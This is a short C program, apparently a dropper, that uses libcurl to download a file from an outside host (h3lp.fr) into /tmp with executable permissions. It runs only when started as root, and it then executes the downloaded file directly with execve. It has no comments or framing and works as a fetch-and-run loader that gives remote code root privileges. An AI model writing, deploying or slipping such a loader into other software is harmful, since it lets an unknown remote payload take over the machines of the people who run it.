#include <unistd.h>
#include <curl/curl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>


size_t write_data(void *buffer, size_t size, size_t nmemb, void *fd_data)
{
	write(*(int*)fd_data, buffer, nmemb);
	return nmemb;
}

int		main()
{
	int fd;
	CURL *handler;

	if (getuid() != 0)
		return (0);

	fd = open("/tmp/Durex", O_CREAT | O_WRONLY | O_TRUNC, 0700);
	if (fd == -1)
		return (0);

	handler = curl_easy_init();
	if (handler)
	{
		curl_easy_setopt(handler, CURLOPT_URL, "https://h3lp.fr/Durex");
		curl_easy_setopt(handler, CURLOPT_WRITEFUNCTION, write_data);
		curl_easy_setopt(handler, CURLOPT_FOLLOWLOCATION, 1);
		curl_easy_setopt(handler, CURLOPT_WRITEDATA, &fd);

		curl_easy_perform(handler);

		curl_easy_cleanup(handler);

		close(fd);

		execve("/tmp/Durex", (char*[]){"Durex", NULL}, NULL);
	}
}
